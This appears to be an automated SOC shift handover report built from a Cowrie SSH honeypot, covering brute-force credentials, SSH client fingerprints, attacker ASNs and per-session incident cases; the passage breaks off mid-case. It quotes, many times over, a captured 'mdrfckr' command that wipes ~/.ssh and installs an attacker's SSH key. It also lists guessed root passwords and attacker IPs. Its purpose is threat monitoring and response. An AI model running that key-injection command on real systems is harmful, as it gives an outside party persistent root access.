# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-17 |
| **Generated At** | 2026-04-17T13:27:32Z |
| **Shift Time** | 13:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **85** |
| Confirmed Threats | **83** |
| False Positives Filtered | **2** (2.4%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **7** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **70** |
| Unique Credential Pairs | **33** |
| Unique Usernames | **15** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 15 |
| `GET / HTTP/1.1` | 4 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 4 |
| `Accept-Encoding: gzip` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `Host: 13.235.92.17:23` | 4 |
| `Accept: */*` | 4 |
| `` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 15 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 4 |
| `Accept-Encoding: gzip` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx54321#` | `51.68.65.117` | 2026-04-17T11:44:49 |
| `root` | `3245gs5662d34` | `51.68.65.117` | 2026-04-17T11:44:53 |
| `root` | `qazwsx01!!` | `51.68.65.117` | 2026-04-17T11:47:43 |
| `root` | `ubuntu` | `101.126.141.180` | 2026-04-17T11:48:19 |
| `root` | `A12345600` | `51.68.65.117` | 2026-04-17T11:49:03 |
| `root` | `Root11111@@` | `51.68.65.117` | 2026-04-17T11:52:33 |
| `root` | `qwertyuio1` | `51.68.65.117` | 2026-04-17T11:56:28 |
| `root` | `qwe!@#456` | `51.68.65.117` | 2026-04-17T11:57:57 |
| `root` | `qwertyuio` | `51.68.65.117` | 2026-04-17T12:02:07 |
| `root` | `Abcd12` | `51.68.65.117` | 2026-04-17T12:03:30 |
| `root` | `XXxx123123` | `51.68.65.117` | 2026-04-17T12:06:12 |
| `root` | `ZAQ!2wsx321@#` | `51.68.65.117` | 2026-04-17T12:08:53 |
| `root` | `ccCC123123` | `51.68.65.117` | 2026-04-17T12:10:18 |
| `root` | `QWE_123` | `51.68.65.117` | 2026-04-17T12:11:41 |
| `root` | `Jack@123` | `51.68.65.117` | 2026-04-17T12:14:26 |
| `root` | `ZZzz123123` | `51.68.65.117` | 2026-04-17T12:19:29 |
| `root` | `01020264` | `197.243.14.52` | 2026-04-17T12:23:56 |
| `root` | `3245gs5662d34` | `197.243.14.52` | 2026-04-17T12:24:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **85** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 62 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 62 | 6 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 62 | 6 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.243.14.52`, `51.68.65.117`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **15** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS213737` | AYOSOFT LTD | 1 | LOW |
| `AS4808` | China Unicom Beijing Province Network | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS37228` | KT RWANDA NETWORK Ltd | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b66e35b16289

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:44 |
| **Last Seen** | 2026-04-17 11:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:44:49` | `cowrie.session.connect` |
| `2026-04-17 11:44:49` | `cowrie.client.version` |
| `2026-04-17 11:44:49` | `cowrie.client.kex` |
| `2026-04-17 11:44:49` | `cowrie.login.success` |
| `2026-04-17 11:44:50` | `cowrie.session.params` |
| `2026-04-17 11:44:50` | `cowrie.command.input` |
| `2026-04-17 11:44:50` | `cowrie.command.failed` |
| `2026-04-17 11:44:50` | `cowrie.log.closed` |
| `2026-04-17 11:44:50` | `cowrie.session.params` |
| `2026-04-17 11:44:50` | `cowrie.command.input` |
| `2026-04-17 11:44:50` | `cowrie.session.file_download` |
| `2026-04-17 11:44:50` | `cowrie.log.closed` |
| `2026-04-17 11:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d506a30cb543

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:44 |
| **Last Seen** | 2026-04-17 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:44:52` | `cowrie.session.connect` |
| `2026-04-17 11:44:52` | `cowrie.client.version` |
| `2026-04-17 11:44:53` | `cowrie.client.kex` |
| `2026-04-17 11:44:53` | `cowrie.login.success` |
| `2026-04-17 11:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8202f6c3533

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:47 |
| **Last Seen** | 2026-04-17 11:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:47:42` | `cowrie.session.connect` |
| `2026-04-17 11:47:42` | `cowrie.client.version` |
| `2026-04-17 11:47:43` | `cowrie.client.kex` |
| `2026-04-17 11:47:43` | `cowrie.login.success` |
| `2026-04-17 11:47:43` | `cowrie.session.params` |
| `2026-04-17 11:47:43` | `cowrie.command.input` |
| `2026-04-17 11:47:43` | `cowrie.command.failed` |
| `2026-04-17 11:47:44` | `cowrie.log.closed` |
| `2026-04-17 11:47:44` | `cowrie.session.params` |
| `2026-04-17 11:47:44` | `cowrie.command.input` |
| `2026-04-17 11:47:44` | `cowrie.session.file_download` |
| `2026-04-17 11:47:44` | `cowrie.log.closed` |
| `2026-04-17 11:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1466ad287ae7

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:47 |
| **Last Seen** | 2026-04-17 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:47:46` | `cowrie.session.connect` |
| `2026-04-17 11:47:46` | `cowrie.client.version` |
| `2026-04-17 11:47:46` | `cowrie.client.kex` |
| `2026-04-17 11:47:47` | `cowrie.login.success` |
| `2026-04-17 11:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c846ee18df72

| Field | Detail |
|---|---|
| **Source IP** | `101.126.141[.]180` |
| **First Seen** | 2026-04-17 11:48 |
| **Last Seen** | 2026-04-17 11:53 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:48:18` | `cowrie.session.connect` |
| `2026-04-17 11:48:18` | `cowrie.client.version` |
| `2026-04-17 11:48:19` | `cowrie.client.kex` |
| `2026-04-17 11:48:19` | `cowrie.login.success` |
| `2026-04-17 11:53:19` | `cowrie.session.file_upload` |
| `2026-04-17 11:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.141[.]180` to AbuseIPDB if not already reported
- [ ] Block `101.126.141[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ad176aec50

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:49 |
| **Last Seen** | 2026-04-17 11:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:49:03` | `cowrie.session.connect` |
| `2026-04-17 11:49:03` | `cowrie.client.version` |
| `2026-04-17 11:49:03` | `cowrie.client.kex` |
| `2026-04-17 11:49:03` | `cowrie.login.success` |
| `2026-04-17 11:49:04` | `cowrie.session.params` |
| `2026-04-17 11:49:04` | `cowrie.command.input` |
| `2026-04-17 11:49:04` | `cowrie.command.failed` |
| `2026-04-17 11:49:04` | `cowrie.log.closed` |
| `2026-04-17 11:49:04` | `cowrie.session.params` |
| `2026-04-17 11:49:04` | `cowrie.command.input` |
| `2026-04-17 11:49:04` | `cowrie.session.file_download` |
| `2026-04-17 11:49:04` | `cowrie.log.closed` |
| `2026-04-17 11:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd09dd1fe1e8

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:49 |
| **Last Seen** | 2026-04-17 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:49:06` | `cowrie.session.connect` |
| `2026-04-17 11:49:06` | `cowrie.client.version` |
| `2026-04-17 11:49:07` | `cowrie.client.kex` |
| `2026-04-17 11:49:07` | `cowrie.login.success` |
| `2026-04-17 11:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-458cf0495ebb

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:52 |
| **Last Seen** | 2026-04-17 11:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:52:32` | `cowrie.session.connect` |
| `2026-04-17 11:52:32` | `cowrie.client.version` |
| `2026-04-17 11:52:32` | `cowrie.client.kex` |
| `2026-04-17 11:52:33` | `cowrie.login.success` |
| `2026-04-17 11:52:33` | `cowrie.session.params` |
| `2026-04-17 11:52:33` | `cowrie.command.input` |
| `2026-04-17 11:52:33` | `cowrie.command.failed` |
| `2026-04-17 11:52:33` | `cowrie.log.closed` |
| `2026-04-17 11:52:34` | `cowrie.session.params` |
| `2026-04-17 11:52:34` | `cowrie.command.input` |
| `2026-04-17 11:52:34` | `cowrie.session.file_download` |
| `2026-04-17 11:52:34` | `cowrie.log.closed` |
| `2026-04-17 11:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9aca065d6f9

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:52 |
| **Last Seen** | 2026-04-17 11:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:52:36` | `cowrie.session.connect` |
| `2026-04-17 11:52:36` | `cowrie.client.version` |
| `2026-04-17 11:52:36` | `cowrie.client.kex` |
| `2026-04-17 11:52:37` | `cowrie.login.success` |
| `2026-04-17 11:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55bc55d583f8

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:56 |
| **Last Seen** | 2026-04-17 11:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:56:28` | `cowrie.session.connect` |
| `2026-04-17 11:56:28` | `cowrie.client.version` |
| `2026-04-17 11:56:28` | `cowrie.client.kex` |
| `2026-04-17 11:56:28` | `cowrie.login.success` |
| `2026-04-17 11:56:29` | `cowrie.session.params` |
| `2026-04-17 11:56:29` | `cowrie.command.input` |
| `2026-04-17 11:56:29` | `cowrie.command.failed` |
| `2026-04-17 11:56:29` | `cowrie.log.closed` |
| `2026-04-17 11:56:29` | `cowrie.session.params` |
| `2026-04-17 11:56:29` | `cowrie.command.input` |
| `2026-04-17 11:56:29` | `cowrie.session.file_download` |
| `2026-04-17 11:56:29` | `cowrie.log.closed` |
| `2026-04-17 11:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f2db59024ea

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:56 |
| **Last Seen** | 2026-04-17 11:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:56:32` | `cowrie.session.connect` |
| `2026-04-17 11:56:32` | `cowrie.client.version` |
| `2026-04-17 11:56:32` | `cowrie.client.kex` |
| `2026-04-17 11:56:32` | `cowrie.login.success` |
| `2026-04-17 11:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0dbc87c6fd9

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:57 |
| **Last Seen** | 2026-04-17 11:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:57:57` | `cowrie.session.connect` |
| `2026-04-17 11:57:57` | `cowrie.client.version` |
| `2026-04-17 11:57:57` | `cowrie.client.kex` |
| `2026-04-17 11:57:57` | `cowrie.login.success` |
| `2026-04-17 11:57:58` | `cowrie.session.params` |
| `2026-04-17 11:57:58` | `cowrie.command.input` |
| `2026-04-17 11:57:58` | `cowrie.command.failed` |
| `2026-04-17 11:57:58` | `cowrie.log.closed` |
| `2026-04-17 11:57:58` | `cowrie.session.params` |
| `2026-04-17 11:57:58` | `cowrie.command.input` |
| `2026-04-17 11:57:58` | `cowrie.session.file_download` |
| `2026-04-17 11:57:58` | `cowrie.log.closed` |
| `2026-04-17 11:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd777147171

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 11:58 |
| **Last Seen** | 2026-04-17 11:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 11:58:00` | `cowrie.session.connect` |
| `2026-04-17 11:58:00` | `cowrie.client.version` |
| `2026-04-17 11:58:00` | `cowrie.client.kex` |
| `2026-04-17 11:58:01` | `cowrie.login.success` |
| `2026-04-17 11:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88605ae7a41a

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-17 12:02 |
| **Last Seen** | 2026-04-17 12:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
